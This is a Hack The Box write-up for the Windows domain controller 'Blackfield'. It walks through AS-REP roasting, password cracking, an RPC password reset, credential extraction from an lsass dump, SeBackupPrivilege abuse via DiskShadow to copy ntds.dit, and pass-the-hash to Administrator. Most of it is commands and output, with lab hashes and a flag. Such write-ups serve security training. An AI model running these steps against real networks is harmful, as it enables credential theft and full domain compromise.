---
"title": "Hack The Box - Blackfield"
"date": 2020-10-03
"tags": ["windows", "smb", "kerberos", "rpcclient", "lsadump", "BackupPriv"]
"keywords": ["windows", "smb", "kerberos", "rpcclient", "lsadump", "BackupPriv"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Blackfield is a good Windows Activity directory box, first we need exploit AS-REP-roasting we can reset another user’s password over RPC. With access to another share, We will found a bunch of process memory dumps, one of which is lsadump and we get user password. User have Special privilege called SeBackupPrivilege and SeRestorePrivilege using that and DiskShadow we can copy the Drive."
"featured_image": "/img/htb-blackfield/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-blackfield/Untitled.png)

Blackfield is a good Windows Activity directory box, first we need exploit AS-REP-roasting we can reset another user’s password over RPC. With access to another share, We will found a bunch of process memory dumps, one of which is lsadump and we get user password. User have Special privilege called SeBackupPrivilege and SeRestorePrivilege using that and DiskShadow we can copy the Drive.

Link: [https://www.hackthebox.eu/home/machines/profile/255](https://www.hackthebox.eu/home/machines/profile/255)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```nix
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-10 09:46:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/10%Time=5EE04886%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h04m15s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-10T09:49:09
|_  start_date: N/A
```

## SMB Enumeration

```nix
root@kali:~/CTF/HTB/Boxes/Blackfield# smbclient -L 10.10.10.192
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share
```

I'm unable to list in these shares but I logged in without any password.

```nix
root@kali:~/CTF/HTB/Boxes/Blackfield# smbclient //10.10.10.192/forensic
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
root@kali:~/CTF/HTB/Boxes/Blackfield# smbclient //10.10.10.192/SYSVOL
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
root@kali:~/CTF/HTB/Boxes/Blackfield# smbclient //10.10.10.192/NETLOGON
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
```

In `profiles$` share I found lot of users directory and there is no files inside, If u see the `0`  it shows there is not content inside them.

```nix
root@kali:~/CTF/HTB/Boxes/Blackfield# smbclient //10.10.10.192/profiles$
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 22:17:12 2020
  ..                                  D        0  Wed Jun  3 22:17:12 2020
  AAlleni                             D        0  Wed Jun  3 22:17:11 2020
  ABarteski                           D        0  Wed Jun  3 22:17:11 2020
  ABekesz                             D        0  Wed Jun  3 22:17:11 2020
  ABenzies                            D        0  Wed Jun  3 22:17:11 2020
.
.
.
.
  YHuftalin                           D        0  Wed Jun  3 22:17:12 2020
  YKivlen                             D        0  Wed Jun  3 22:17:12 2020
  YKozlicki                           D        0  Wed Jun  3 22:17:12 2020
  YNyirenda                           D        0  Wed Jun  3 22:17:12 2020
  YPredestin                          D        0  Wed Jun  3 22:17:12 2020
  YSeturino                           D        0  Wed Jun  3 22:17:12 2020
  YSkoropada                          D        0  Wed Jun  3 22:17:12 2020
  YVonebers                           D        0  Wed Jun  3 22:17:12 2020
  YZarpentine                         D        0  Wed Jun  3 22:17:12 2020
  ZAlatti                             D        0  Wed Jun  3 22:17:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 22:17:12 2020
  ZMalaab                             D        0  Wed Jun  3 22:17:12 2020
  ZMiick                              D        0  Wed Jun  3 22:17:12 2020
  ZScozzari                           D        0  Wed Jun  3 22:17:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 22:17:12 2020
  ZWausik                             D        0  Wed Jun  3 22:17:12 2020

		7846143 blocks of size 4096. 4098895 blocks available
```

Copied them to my machine and grab the username alone.

Totally 314 User names we found

```nix
root@kali:~/CTF/HTB/Boxes/Blackfield# cat smb_profile | awk '{print $1}' > smb_users
root@kali:~/CTF/HTB/Boxes/Blackfield# wc -l smb_users 
314 smb_users
```

## Kerberos Enumeration

Since the port 88 is open, we can move on to the kerberosting technique. But to do Kerberosting technique we need credentials on the domain to authenticate. But we have a chance if `Do not require Kerberos preauthentication` is True. There is a tool called `GetNPUsers.py` from [Impackets](https://github.com/SecureAuthCorp/impacket).

This is the tool we looking for, let’s give a try.

![Untitled](/img/htb-forest/296181db8d754f9989a8d896078908ba.png)

Since we already got some list of users, I decided to use them.

```nix
root@kali:~/CTF/HTB/Boxes/Blackfield# GetNPUsers.py -usersfile smb_users -dc-ip 10.10.10.192 -request blackfield.local/
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
.
.
.
.
.
$krb5asrep$23$support@BLACKFIELD.LOCAL:61a39b1896f521c0e2f97e2ea34899e6$8045a7e886363c063c13640534e10c5526b9bbe6f89b0a9abb77323b58a384bc244dc66a7b491f8977722875f986f34554d3d5459f998e64def8c5aaf0d415164c46980e9aec221de9abe3cf49cd816fa51b8077128b948c025f831fd80ade0c47734da39ca14dc6e15ef2da5b441e009c887d758a978a505f786caf1a6b833d81dc1fa8a6a3e29bb098149c279622e524b295c7f07946cde5a2abe243209846af5591e0fad7cc67bbb028580064d02ef70461cfb108605be0faf5f3316ede61a80e5e6118f432c2bc27d5f949e23a2d75fba492f80b17a92beabc830b2624204a8cdd7bdddd17343d1ae810eae5d199274a79f0
.
.
.
.
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

And we got a hash here.

I cracked the hash using John

```nix
root@kali:~/CTF/HTB/Boxes/Blackfield# john --wordlist=/usr/share/wordlists/rockyou.txt kerb.john 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
1g 0:00:00:09 DONE (2020-06-10 09:30) 0.1028g/s 1474Kp/s 1474Kc/s 1474KC/s #1WIF3Y.."chito"
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~/CTF/HTB/Boxes/Blackfield# john --show kerb.john 
$krb5asrep$23$support@BLACKFIELD.LOCAL:#00^BlackKnight

1 password hash cracked, 0 left
```

We got the password for `support : #00^BlackKnight`

I tried login with `evil-winrm` but it failed so I decided to go back to SMB 

```nix
root@kali:~/CTF/HTB/Boxes/Blackfield# smbclient //10.10.10.192/SYSVOL -U 'support'
Enter WORKGROUP\support's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 16:43:05 2020
  ..                                  D        0  Sun Feb 23 16:43:05 2020
  BLACKFIELD.local                    D        0  Sun Feb 23 16:43:05 2020
re
		7846143 blocks of size 4096. 4098569 blocks available
smb: \> recurse on
smb: \> ls
  .                                   D        0  Sun Feb 23 16:43:05 2020
  ..                                  D        0  Sun Feb 23 16:43:05 2020
  BLACKFIELD.local                    D        0  Sun Feb 23 16:43:05 2020

\BLACKFIELD.local
  .                                   D        0  Sun Feb 23 16:49:28 2020
  ..                                  D        0  Sun Feb 23 16:49:28 2020
  DfsrPrivate                       DHS        0  Sun Feb 23 16:49:28 2020
  Policies                            D        0  Sun Feb 23 16:43:14 2020
  scripts                             D        0  Sun Feb 23 16:43:05 2020

\BLACKFIELD.local\DfsrPrivate
NT_STATUS_ACCESS_DENIED listing \BLACKFIELD.local\DfsrPrivate\*

\BLACKFIELD.local\Policies
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sun Feb 23 16:43:14 2020
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sun Feb 23 16:43:14 2020

\BLACKFIELD.local\scripts
  .                                   D        0  Sun Feb 23 16:43:05 2020
  ..                                  D        0  Sun Feb 23 16:43:05 2020

\BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020
  GPT.INI                             A       22  Sun Feb 23 16:50:36 2020
  MACHINE                             D        0  Sun Feb 23 16:50:36 2020
  USER                                D        0  Sun Feb 23 16:43:14 2020

\BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020
  GPT.INI                             A       22  Sun Feb 23 16:43:14 2020
  MACHINE                             D        0  Sun Feb 23 16:43:14 2020
  USER                                D        0  Sun Feb 23 16:43:14 2020

\BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
  .                                   D        0  Sun Feb 23 16:50:36 2020
  ..                                  D        0  Sun Feb 23 16:50:36 2020
  Microsoft                           D        0  Sun Feb 23 16:43:14 2020
  Registry.pol                        A     2796  Sun Feb 23 16:50:36 2020

\BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020

\BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020
  Microsoft                           D        0  Sun Feb 23 16:43:14 2020

\BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020

\BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020
  Windows NT                          D        0  Sun Feb 23 16:43:14 2020

\BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020
  Windows NT                          D        0  Sun Feb 23 16:43:14 2020

\BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020
  SecEdit                             D        0  Sun Feb 23 16:43:14 2020

\BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020
  SecEdit                             D        0  Sun Feb 23 16:43:14 2020

\BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020
  GptTmpl.inf                         A     1098  Sun Feb 23 16:43:14 2020

\BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sun Feb 23 16:43:14 2020
  ..                                  D        0  Sun Feb 23 16:43:14 2020
  GptTmpl.inf                         A     3764  Sun Feb 23 16:43:14 2020
smb: \>
```

Checked them all but nothing seems useful

## RPC Enumeration

```nix
root@kali:~/CTF/HTB/Boxes/Blackfield/BloodHound# rpcclient -U 'support%#00^BlackKnight' 10.10.10.192
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
user:[BLACKFIELD764430] rid:[0x451]
user:[BLACKFIELD538365] rid:[0x452]
.
.
.
.
.
user:[BLACKFIELD307633] rid:[0x57e]
user:[BLACKFIELD758945] rid:[0x57f]
user:[BLACKFIELD541148] rid:[0x580]
user:[BLACKFIELD532412] rid:[0x581]
user:[BLACKFIELD996878] rid:[0x582]
user:[BLACKFIELD653097] rid:[0x583]
user:[BLACKFIELD438814] rid:[0x584]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]
rpcclient $>
```

> [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)

```nix
rpcclient $> setuserinfo2 audit2020 23 'ASDqwe123'
rpcclient $>
```

This time I tried login in `forensic` share and Im logged in.

```bash
root@kali:~/CTF/HTB/Boxes/Blackfield# smbclient //10.10.10.192/forensic -U 'audit2020'
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 18:33:16 2020
  ..                                  D        0  Sun Feb 23 18:33:16 2020
  commands_output                     D        0  Sun Feb 23 23:44:37 2020
  memory_analysis                     D        0  Fri May 29 01:58:33 2020
  tools                               D        0  Sun Feb 23 19:09:08 2020

		7846143 blocks of size 4096. 4095546 blocks available
smb: \>
```

These are tools used for Digital forensics.

```bash
smb: \> cd tools
smb: \tools\> ls
  .                                   D        0  Sun Feb 23 19:09:08 2020
  ..                                  D        0  Sun Feb 23 19:09:08 2020
  sleuthkit-4.8.0-win32               D        0  Sun Feb 23 19:09:03 2020
  sysinternals                        D        0  Sun Feb 23 19:05:25 2020
  volatility                          D        0  Sun Feb 23 19:05:39 2020

		7846143 blocks of size 4096. 4095034 blocks available
smb: \tools\>
```

So these must be the files which are got from the tools.

```bash
smb: \> cd memory_analysis
ls
smb: \memory_analysis\> ls
  .                                   D        0  Fri May 29 01:58:33 2020
  ..                                  D        0  Fri May 29 01:58:33 2020
  conhost.zip                         A 37876530  Fri May 29 01:55:36 2020
  ctfmon.zip                          A 24962333  Fri May 29 01:55:45 2020
  dfsrs.zip                           A 23993305  Fri May 29 01:55:54 2020
  dllhost.zip                         A 18366396  Fri May 29 01:56:04 2020
  ismserv.zip                         A  8810157  Fri May 29 01:56:13 2020
  lsass.zip                           A 41936098  Fri May 29 01:55:08 2020
  mmc.zip                             A 64288607  Fri May 29 01:55:25 2020
  RuntimeBroker.zip                   A 13332174  Fri May 29 01:56:24 2020
  ServerManager.zip                   A 131983313  Fri May 29 01:56:49 2020
  sihost.zip                          A 33141744  Fri May 29 01:57:00 2020
  smartscreen.zip                     A 33756344  Fri May 29 01:57:11 2020
  svchost.zip                         A 14408833  Fri May 29 01:57:19 2020
  taskhostw.zip                       A 34631412  Fri May 29 01:57:30 2020
  winlogon.zip                        A 14255089  Fri May 29 01:57:38 2020
  wlms.zip                            A  4067425  Fri May 29 01:57:44 2020
  WmiPrvSE.zip                        A 18303252  Fri May 29 01:57:53 2020
```

There is `[lsass.zip](http://lsass.zip)`.

> What is LSASS? Local Security Authority Subsystem Service is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system

## Getting User Shell

Downloaded to my machine. 

```bash
root@kali:~/CTF/HTB/Boxes/Blackfield/memory_analysis# smbget -R smb://10.10.10.192/forensic/memory_analysis/lsass.zip -U audit2020
Password for [audit2020] connecting to //forensic/10.10.10.192: 
Using workgroup WORKGROUP, user audit2020
smb://10.10.10.192/forensic/memory_analysis/lsass.zip                                                                 
Downloaded 39.99MB in 557 seconds
root@kali:~/CTF/HTB/Boxes/Blackfield/forensic/memory_analysis# unzip lsass.zip 
Archive:  lsass.zip
  inflating: lsass.DMP               
root@kali:~/CTF/HTB/Boxes/Blackfield/forensic/memory_analysis# ls
lsass.DMP  lsass.zip
```

It contains `lsass.dmp` file, it is dump file.

We can extract password from it

> [https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330](https://medium.com/@ali.bawazeeer/using-mimikatz-to-get-cleartext-password-from-offline-memory-dump-76ed09fd3330)

![Untitled](/img/htb-blackfield/Untitled%201.png)

```nix
root@kali:~/CTF/HTB/Boxes/Blackfield# evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_backup> cd Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> dir

    Directory: C:\Users\svc_backup\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/9/2020   5:39 PM             34 user.txt

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
b5------------------------------0a6
```

## Privilege Escalation

```nix
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

> SeBackupPrivilege - Required to perform backup operations. This privilege causes the system to grant all read access control to any file, regardless of the access control list (ACL) specified for the file. Any access request other than read is still evaluated with the ACL. This privilege is required by the RegSaveKey and RegSaveKeyExfunctions. The following access rights are granted if this privilege is held: READ_CONTROL ACCESS_SYSTEM_SECURITY FILE_GENERIC_READ FILE_TRAVERSE User Right: Back up files and directories.

So I Googled about what we can do with this Privilege and Found these.

> [https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)

> [https://roberthosborne.com/privesc](https://roberthosborne.com/privesc)

> [https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)

> What is NTDS.dit? This file is AD database it contains all account information and passwords from AD domain, so if we compromise this file we can do anything.

`script.txt`

```nix
set metadata C:\Windows\System32\spool\drivers\color\sss.cabs
set context clientaccessibles
set context persistents
begin backups
add volume c: alias mydrives
creates
expose %mydrive% z:
```

```nix
*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  6/10/2020 1:41:53 PM

-> set metadata C:\Windows\System32\spool\drivers\color\sss.cab
The existing file will be overwritten.
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume c: alias mydrive
-> create
Alias mydrive for shadow ID {0e25477e-fbdf-4d5b-9b89-856d1d63a57f} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {5f450b2c-b605-400b-a983-cad1c6ff5c21} set as environment variable.

Querying all shadow copies with the shadow copy set ID {5f450b2c-b605-400b-a983-cad1c6ff5c21}

	* Shadow copy ID = {0e25477e-fbdf-4d5b-9b89-856d1d63a57f}		%mydrive%
		- Shadow copy set: {5f450b2c-b605-400b-a983-cad1c6ff5c21}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 6/10/2020 1:42:57 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %mydrive% z:
-> %mydrive% = {0e25477e-fbdf-4d5b-9b89-856d1d63a57f}
The shadow copy was successfully exposed as z:\.
Note: END BACKUP was not commanded, writers not notified BackupComplete.
DiskShadow is exiting.
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Set-SeBackupPrivilege
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Get-SeBackupPrivilege
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Users\svc_backup\Documents\ntds.dit
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\system c:\Users\svc_backup\Documents\system.bak
The operation completed successfully.
```

Finally we got all the files we need, Now download them to your machine.

```nix
root@kali:~/CTF/HTB/Boxes/Blackfield# secretsdump.py -ntds ntds.dit -system system.bak LOCAL
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

```nix
root@kali:~/CTF/HTB/Boxes/Blackfield# evil-winrm -i 10.10.10.192 -u Administrator -H '184fb5e5178480be64824d4cd53b99ee'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
43b7ac28c8ba0ab98dc6b48e94999f3a
```